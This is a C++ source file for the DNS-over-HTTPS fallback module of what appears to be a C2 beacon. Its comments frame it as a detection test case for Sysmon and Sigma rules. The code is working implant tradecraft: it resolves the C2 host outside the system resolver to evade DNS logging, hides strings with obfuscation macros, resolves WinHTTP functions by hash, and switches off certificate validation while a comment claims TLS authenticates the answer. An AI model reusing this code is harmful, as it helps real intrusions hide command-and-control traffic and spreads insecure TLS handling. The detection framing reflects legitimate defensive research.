// doh.cpp — DNS-over-HTTPS fallback resolution (RFC 8484).
//
// Roadmap item "DNS-over-HTTPS fallback channel", built as a detection test
// case first. When the lab resolver is blocked or sinkholed, the beacon still
// needs its C2 address. The system resolver path (dnsapi → Sysmon EID 22
// DnsQuery) is replaced by an HTTPS POST carrying the raw DNS query to a
// public DoH resolver, and the literal answer is used directly.
//
// That is exactly why the technique is measurable: no DnsQuery event is
// emitted for the C2 name, so command_and_control_dns_query_unknown_image.yml
// goes blind, and the compensating host-side signal is the connection to the
// resolver itself (command_and_control_doh_resolver_unknown_image.yml). Both
// halves are written down in detections/README.md.
//
// Endpoints are IP literals by default for a reason: a DoH endpoint given by
// hostname would need the very resolution this path exists to replace. An
// operator pointing GHOST_DOH_URL at their own resolver gets whatever they
// type — the transport refuses plaintext (non-HTTPS) endpoints either way.
//
// Scope limit, stated up front: the resolved address is used for a fresh
// connection carrying the original Host header, but WinHTTP derives TLS SNI
// from the connect target, and there is no supported option to override it.
// An edge that routes TLS by SNI (ngrok, Cloudflare custom hostnames) will
// therefore reject the fallback channel; a bare VPS endpoint works.
// README section 18 records this next to the other honest limits.
#include <winsock2.h>          // ws2tcpip.h (InetNtopW) first: winsock2 before windows.h
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>

#include "doh.hpp"
#include "config.hpp"
#include "utils.hpp"
#include "obfuscate.hpp"
#include <cstdint>
#include <string>
#include <vector>

namespace {

// ── DNS wire format (RFC 1035 §4.1) ─────────────────────────────────────────
constexpr uint16_t kQtypeA    = 1;
constexpr uint16_t kQtypeAAAA = 28;
constexpr uint16_t kClassIN   = 1;

std::vector<BYTE> BuildQuery(const std::string& name, uint16_t qtype, uint16_t id) {
    std::vector<BYTE> q;
    if (name.empty() || name.size() > 253) return q;
    q.reserve(name.size() + 18);
    q.push_back(static_cast<BYTE>(id >> 8));
    q.push_back(static_cast<BYTE>(id & 0xFF));
    q.push_back(0x01); q.push_back(0x00);                    // RD=1
    q.push_back(0x00); q.push_back(0x01);                    // QDCOUNT=1
    for (int i = 0; i < 3; ++i) { q.push_back(0); q.push_back(0); }  // AN/NS/AR=0
    size_t start = 0;
    while (start < name.size()) {
        size_t dot = name.find('.', start);
        if (dot == std::string::npos) dot = name.size();
        const size_t len = dot - start;
        if (len == 0 || len > 63) return {};                 // empty / oversized label
        q.push_back(static_cast<BYTE>(len));
        q.insert(q.end(), name.begin() + start, name.begin() + dot);
        start = dot + 1;
    }
    q.push_back(0x00);                                       // root label
    q.push_back(static_cast<BYTE>(qtype >> 8));
    q.push_back(static_cast<BYTE>(qtype & 0xFF));
    q.push_back(static_cast<BYTE>(kClassIN >> 8));
    q.push_back(static_cast<BYTE>(kClassIN & 0xFF));
    return q;
}

// Advance `off` past a DNS name. Handles compression pointers (2 bytes) and
// the root label; the response is untrusted network input, so every read is
// bounds-checked and the label chain is capped.
bool SkipName(const std::vector<BYTE>& m, size_t& off) {
    size_t labels = 0;
    while (off < m.size() && labels++ < 128) {
        const BYTE len = m[off];
        if ((len & 0xC0) == 0xC0) {
            if (off + 2 > m.size()) return false;
            off += 2;
            return true;
        }
        ++off;
        if (len == 0) return true;
        if (off + len > m.size()) return false;
        off += len;
    }
    return false;
}

// Pull the answer out of a DNS response. Returns an IPv4 literal when the
// message carries one, else the first IPv6 literal; empty when nothing usable
// is present. Malformed tails stop the scan rather than discarding an address
// already found — the goal here is a working fallback, not a strict parser.
std::wstring ParseResponse(const std::vector<BYTE>& m, uint16_t expectId) {
    if (m.size() < 12) return {};
    const uint16_t id    = static_cast<uint16_t>((m[0] << 8) | m[1]);
    const uint16_t flags = static_cast<uint16_t>((m[2] << 8) | m[3]);
    const uint16_t qd    = static_cast<uint16_t>((m[4] << 8) | m[5]);
    const uint16_t an    = static_cast<uint16_t>((m[6] << 8) | m[7]);
    if (id != expectId) return {};
    if (!(flags & 0x8000)) return {};            // QR=0: not a response
    if ((flags & 0x000F) != 0) return {};        // RCODE != NOERROR (NXDOMAIN, SERVFAIL, ...)

    size_t off = 12;
    for (uint16_t i = 0; i < qd; ++i) {
        if (!SkipName(m, off) || off + 4 > m.size()) return {};
        off += 4;                                // QTYPE + QCLASS
    }

    std::wstring v4, v6;
    for (uint16_t i = 0; i < an; ++i) {
        if (!SkipName(m, off) || off + 10 > m.size()) break;
        const uint16_t type  = static_cast<uint16_t>((m[off] << 8) | m[off + 1]);
        const uint16_t rdlen = static_cast<uint16_t>((m[off + 8] << 8) | m[off + 9]);
        off += 10;
        if (off + rdlen > m.size()) break;
        if (type == kQtypeA && rdlen == 4) {
            wchar_t buf[INET_ADDRSTRLEN] = {};
            if (InetNtopW(AF_INET, m.data() + off, buf, INET_ADDRSTRLEN)) {
                v4 = buf;
                break;                           // IPv4 preferred — stop scanning
            }
        } else if (type == kQtypeAAAA && rdlen == 16 && v6.empty()) {
            wchar_t buf[INET6_ADDRSTRLEN] = {};
            if (InetNtopW(AF_INET6, m.data() + off, buf, INET6_ADDRSTRLEN)) v6 = buf;
        }
        off += rdlen;
    }
    return v4.empty() ? v6 : v4;
}

// One-shot HTTPS POST of a wire-format query. Returns the raw response body.
// Deliberately not pooled and not reusing the beacon transport: this is the
// exception path, and it must not send the beacon token or tunnel headers to
// a third-party resolver.
bool PostDnsMessage(const std::wstring& endpoint,
                    const std::vector<BYTE>& query,
                    std::vector<BYTE>& out) {
    static HMODULE hW = []() -> HMODULE {
        HMODULE m = GetModuleHandleA(XS("winhttp.dll"));
        return m ? m : LoadLibraryA(XS("winhttp.dll"));
    }();
    if (!hW) return false;

    auto _CrackUrl    = HASHPROC(hW, WinHttpCrackUrl);
    auto _Open        = HASHPROC(hW, WinHttpOpen);
    auto _Connect     = HASHPROC(hW, WinHttpConnect);
    auto _OpenRequest = HASHPROC(hW, WinHttpOpenRequest);
    auto _SetOption   = HASHPROC(hW, WinHttpSetOption);
    auto _AddHeaders  = HASHPROC(hW, WinHttpAddRequestHeaders);
    auto _SendRequest = HASHPROC(hW, WinHttpSendRequest);
    auto _ReceiveResp = HASHPROC(hW, WinHttpReceiveResponse);
    auto _QueryAvail  = HASHPROC(hW, WinHttpQueryDataAvailable);
    auto _ReadData    = HASHPROC(hW, WinHttpReadData);
    auto _Close       = HASHPROC(hW, WinHttpCloseHandle);
    if (!_CrackUrl || !_Open || !_Connect || !_OpenRequest || !_SendRequest ||
        !_ReceiveResp || !_Close) return false;

    wchar_t host[256] = {}, path[512] = {};
    URL_COMPONENTS uc = {};
    uc.dwStructSize = sizeof(uc);
    uc.lpszHostName = host; uc.dwHostNameLength = 256;
    uc.lpszUrlPath  = path; uc.dwUrlPathLength  = 512;
    if (!_CrackUrl(endpoint.c_str(), 0, 0, &uc)) return false;
    if (uc.nScheme != INTERNET_SCHEME_HTTPS) return false;   // plaintext DoH is not DoH

    HINTERNET hSes = _Open(config::GetUserAgent(),
                           WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSes)
        hSes = _Open(config::GetUserAgent(), WINHTTP_ACCESS_TYPE_NO_PROXY,
                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSes) return false;

    // Short timeouts: the beacon has its own cadence, and a stalled resolver
    // must not stretch a beacon cycle past its schedule.
    DWORD timeout = 15000;
    if (_SetOption) {
        _SetOption(hSes, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(hSes, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
        _SetOption(hSes, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));
    }

    HINTERNET hCon = _Connect(hSes, host, uc.nPort, 0);
    if (!hCon) { _Close(hSes); return false; }

    HINTERNET hReq = _OpenRequest(hCon, L"POST", path, nullptr,
                                  WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  WINHTTP_FLAG_SECURE);
    if (!hReq) { _Close(hCon); _Close(hSes); return false; }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    if (_SetOption) _SetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    auto hdrLiteral = XSW(L"Content-Type: application/dns-message\r\n"
                          L"Accept: application/dns-message");
    const std::wstring headers = hdrLiteral.str();
    if (_AddHeaders)
        _AddHeaders(hReq, headers.c_str(), static_cast<DWORD>(headers.size()),
                    WINHTTP_ADDREQ_FLAG_ADD);

    BOOL sent = _SendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                             const_cast<BYTE*>(query.data()),
                             static_cast<DWORD>(query.size()),
                             static_cast<DWORD>(query.size()), 0);
    bool ok = sent && _ReceiveResp(hReq, nullptr);
    if (ok && _QueryAvail && _ReadData) {
        DWORD avail = 0;
        while (_QueryAvail(hReq, &avail) && avail > 0) {
            const size_t base = out.size();
            if (base + avail > 8192) break;      // DNS answers are small; cap hard
            out.resize(base + avail);
            DWORD rd = 0;
            if (!_ReadData(hReq, out.data() + base, avail, &rd) || rd == 0) {
                out.resize(base);
                break;
            }
            out.resize(base + rd);
        }
    }
    _Close(hReq); _Close(hCon); _Close(hSes);
    return ok && !out.empty();
}

}  // namespace

std::wstring doh::Resolve(const std::wstring& hostname, const std::wstring& endpoint) {
    if (hostname.empty() || endpoint.empty()) return {};
    const std::string name = WStringToUTF8(hostname);
    if (name.empty() || name.size() > 253) return {};

    // Query id: random when the RNG works, tick-derived otherwise. It is a
    // correlation handle, not a security boundary — TLS already authenticates
    // the resolver's answer — but a fixed id would let a stale response for a
    // previous lookup be accepted as this one's.
    uint16_t id = 0;
    unsigned char rb[2] = {};
    if (BCRYPT_SUCCESS(BCryptGenRandom(nullptr, rb, sizeof(rb),
                                       BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
        id = static_cast<uint16_t>((rb[0] << 8) | rb[1]);
    } else {
        const DWORD tick = GetTickCount();
        id = static_cast<uint16_t>(tick ^ (tick >> 16));
    }

    const uint16_t types[] = { kQtypeA, kQtypeAAAA };
    for (uint16_t qtype : types) {
        std::vector<BYTE> query = BuildQuery(name, qtype, id);
        if (query.empty()) return {};
        std::vector<BYTE> resp;
        if (!PostDnsMessage(endpoint, query, resp)) continue;
        std::wstring ip = ParseResponse(resp, id);
        if (!ip.empty()) return ip;
    }
    return {};
}
